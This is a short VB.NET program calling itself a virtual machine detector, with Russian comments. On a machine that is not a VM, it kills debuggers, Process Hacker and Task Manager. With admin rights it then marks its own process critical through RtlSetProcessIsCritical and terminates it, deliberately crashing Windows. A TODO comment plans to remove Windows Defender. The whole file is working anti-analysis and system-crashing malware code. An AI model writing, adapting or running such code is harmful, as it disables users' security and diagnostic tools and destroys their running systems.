Imports System
Imports System.Management
Imports System.Diagnostics
Imports System.Threading.Tasks
Imports System.Runtime.InteropServices
Imports System.Security.Principal
Imports Microsoft.Win32

Module App
    ' (C) Толстопятов Алексей А.
    '
    '     VENVDE (Virtual Environment Detector)
    ' Автор идеи: htts://github.com/NYAN-x-CAT
    ' Проверяет, работает ли ОС в виртуальной машине

    Sub Main()
        If Not HasVirtualMachineDrivers() Then
            KillHauntedProcesses()
            KillYourself()
        End If
    End Sub

    ''' <summary>
    ''' Задает WMI запрос в консоли управления, 
    ''' ищет все что связано с виртуальными устройствами.
    ''' </summary>
    ''' <returns>Установлены ли драйвера/инструменты виртуального железа</returns>
    Function HasVirtualMachineDrivers() As Boolean
        Using searchEngine As New ManagementObjectSearcher("select * from Win32_ComputerSystem")
            Using items As ManagementObjectCollection = searchEngine.Get
                For Each item In items
                    Dim tag As String = item("Manufacturer").ToString().ToLower()
                    If (tag.ToLowerInvariant = "microsoft corporation") And (
                        item("Model").ToString().ToLower().ToLowerInvariant().Contains("virtual")) Or (
                        item("Model").ToString().ToLower().ToLowerInvariant().Contains("virtualbox")) Or (
                        item("Model").ToString().ToLower().ToLowerInvariant().Contains("vmware")) Then
                        Return True
                    End If
                Next
            End Using
        End Using
        Return False
    End Function

    ''' <summary>
    ''' Ищет и Завершает преследуемые процессы.
    ''' </summary>
    Sub KillHauntedProcesses()
        Dim pList As String() = {
            "ProcessHacker",
            "x64dbg",
            "x32dbg",
            "ollydbg",
            "devenv",
            "windbg",
            "taskmgr"
        }

        For Each pName As String In pList
            Dim pRange = Process.GetProcessesByName(pName)
            If pRange.Length = 0 Then
                Continue For
            Else
                For Each subP In pRange
                    subP.Kill()
                Next
            End If
        Next
    End Sub

    ''' <summary>
    ''' функция Native API, которая позволяет пометить процесс как критичный.
    ''' Прототип функции выглядит следующим образом:
    '''     NTSYSAPI NTSTATUS STDAPIVCALLTYPE RtlSetProcessIsCritical(
    '''         IN BOOLEAN NewValue, 
    '''         OUT PBOOLEAN OldValue OPTIONAL,
    '''         IN BOOLEAN CheckFlag) {};
    ''' </summary>
    ''' <param name="v1">Новое значение</param>
    ''' <param name="v2">Старое значение</param>
    ''' <param name="v3">Флаг проверки</param>
    ''' <returns></returns>
    <DllImport("ntdll.dll", SetLastError:=True)>
    Public Function RtlSetProcessIsCritical(v1 As UInt32, v2 As UInt32, v3 As UInt32)
    End Function

    ' TODO: Убрать из ОС - Защитник "Windows"
    'Sub KillMicrosoftDefender()


    ''' <summary>
    ''' Останавливает систему, завершением venvde
    ''' (Требуются права Администратора)
    ''' </summary>
#Disable Warning
    Sub KillYourself()
        ' Я знаю, что можно заменить WindowsPrincipal (System.Security.Principal.WindowsPrincipal)
        If (WindowsPrincipal.Current.IsInRole(544)) Then
            Process.EnterDebugMode()
            RtlSetProcessIsCritical(1, 0, 0)
            Process.GetCurrentProcess().Kill()
        End If
    End Sub

End Module
